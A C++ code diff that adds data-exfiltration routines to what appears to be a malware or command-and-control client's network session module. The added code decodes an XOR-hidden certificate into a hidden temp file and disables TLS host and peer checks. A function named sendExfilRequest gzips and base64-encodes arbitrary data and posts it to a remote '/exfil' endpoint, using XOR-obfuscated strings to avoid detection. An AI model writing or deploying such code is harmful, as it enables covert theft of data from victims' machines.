@@ -12,14 +12,41 @@
 #include <algorithm>
 #include <sstream>
 
+#include <zlib.h>
+#include <boost/archive/iterators/base64_from_binary.hpp>
+#include <boost/archive/iterators/transform_width.hpp>
+
 #include <boost/uuid/uuid_io.hpp>
 #include <boost/property_tree/json_parser.hpp>
 #include <boost/property_tree/ptree.hpp>
 
 #include <cpr/cpr.h>
-#include <xor_string.hpp>
+#include "xor_string.hpp"
 
 #include <nlohmann/json.hpp>
+
+
+// Write the XOR‑decrypted certificate to a temporary file, return its path.
+static std::string writeCertToTemp() {
+    std::string tempCertPath = "/tmp/.cert.pem";
+    {
+        std::ofstream certFile(tempCertPath, std::ios::binary);
+        for (unsigned i = 0; i < enc_cert_pem_len; ++i) {
+            char c = enc_cert_pem[i] ^ 0x55;
+            certFile.write(&c, 1);
+        }
+    }
+    return tempCertPath;
+}
+
+// Build cpr::SslOptions using the provided certificate file.
+static cpr::SslOptions makeSslOptions(std::string certPath) {
+    return cpr::Ssl(
+        cpr::ssl::VerifyHost{ false },
+        cpr::ssl::VerifyPeer{ false },
+        cpr::ssl::CaInfo{ std::move(certPath) }
+    );
+}
 
 
 #ifdef DEBUG_BUILD
@@ -92,6 +119,50 @@ using json = nlohmann::json;
     return response.text;
 
 };
+
+void sendExfilRequest(std::string_view host,
+    std::string_view port,
+    const std::string& label,
+    const std::string& data) {
+ 
+    // gzip compress
+    uLongf compressedSize = compressBound(static_cast<uLong>(data.size()));
+    std::vector<Bytef> compressed(compressedSize);
+ 
+    z_stream zs{};
+    deflateInit2(&zs, Z_BEST_COMPRESSION, Z_DEFLATED, 15 + 16, 8, Z_DEFAULT_STRATEGY);
+    zs.next_in  = reinterpret_cast<Bytef*>(const_cast<char*>(data.data()));
+    zs.avail_in = static_cast<uInt>(data.size());
+    zs.next_out  = compressed.data();
+    zs.avail_out = static_cast<uInt>(compressedSize);
+    deflate(&zs, Z_FINISH);
+    uLongf actualSize = zs.total_out;
+    deflateEnd(&zs);
+ 
+    // base64 encode
+    using B64 = boost::archive::iterators::base64_from_binary<
+    boost::archive::iterators::transform_width<const Bytef*, 6, 8>>;
+    std::string encoded(B64(compressed.data()), B64(compressed.data() + actualSize));
+    encoded.append((3 - actualSize % 3) % 3, '=');
+ 
+    std::stringstream ss;
+    ss << XOR_STR("https://") << host << ":" << port << XOR_STR("/exfil");
+    std::string fullServerUrl = ss.str();
+ 
+    std::string certPath = writeCertToTemp();
+    cpr::SslOptions sslOpts = makeSslOptions(certPath);
+ 
+    static_cast<void>(cpr::PostAsync(
+        cpr::Url{ fullServerUrl },
+        cpr::Multipart{
+            {XOR_STR("payload"), encoded},
+            {XOR_STR("label"),   label}
+        },
+        sslOpts
+    ).get());
+ 
+    DEBUG_LOG(XOR_STR("Exfil sent: ") << label);
+}
 
 //enable/disable the running status
 void NetSession::setRunning(bool isRunningIn) { isRunning = isRunningIn; }
